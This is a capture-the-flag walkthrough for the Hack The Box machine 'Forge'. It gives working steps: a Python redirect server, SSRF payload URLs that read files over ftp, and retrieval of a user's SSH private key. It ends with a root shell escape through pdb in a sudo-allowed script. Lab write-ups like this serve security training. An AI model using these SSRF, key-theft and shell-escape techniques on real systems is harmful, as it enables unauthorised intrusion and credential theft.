![FORGE](banner.png)

```
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open     http    Apache httpd 2.4.41
Service Info: Host: 10.129.216.84; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold

So there is a webpage at 80 and a filtered ftp. 
On 80 we can upload some files but we couldn't find something of interest.

With
```
┌──(kali㉿kali)-[~/Downloads]
└─$ ffuf -c -w ~/Downloads/Subdomain.txt -u http://forge.htb/ -H "Host: FUZZ.forge.htb" -fw 18 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://forge.htb/
 :: Wordlist         : FUZZ: /home/kali/Downloads/Subdomain.txt
 :: Header           : Host: FUZZ.forge.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 18
________________________________________________

admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]
:: Progress: [649649/649649] :: Job [1/1] :: 566 req/sec :: Duration: [0:09:46] :: Errors: 0 ::
```
we discovered a subdomain: `admin.forge.htb`.
That site tells us that we must be localhost to get access. 
We can abuse the other upload page for that.
For this we need to redirect the upload functionality back to the admin page. You can use a script like this:
```python3
#!/usr/bin/env python3

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("""
Usage: {} <port_number> <url>
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(302)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

Now you can read files via ftp with an upload calling your host while the redirect is set up like:
```
sudo python3 redirect.py 1337 "http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123\!@<target>/"
```

## User

As the home directory contains the `.ssh` we can download its id_rsa like:
```
sudo python3 redirect.py 1337 "http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123\!@<target>/.ssh/id_rsa"
```
You can download the rsa key by uploading via url from your attacker machine. With the given link to the "image" you can read or curl the rsa key.
With `ssh -i <key> user@forge.htb` you will get user access.


## Root

Running `sudo -l` you'll get the following:

```
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

So we can run that `remote-manage.py` as root.
The script looks like:
```python3
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

As you can see it will drop into pdb when it gets an error.
We can abuse this by running the script as root `sudo /usr/bin/python3 /opt/remote-manage.py`, setting up another ssh connection, running netcat to the given port and enter some random stuff. 
Now the connection where we runned the script is dropped into pdb. 
As we run this with root we can escape with 
```
import os; 
os.system("/bin/sh")
```
to get a root shell.
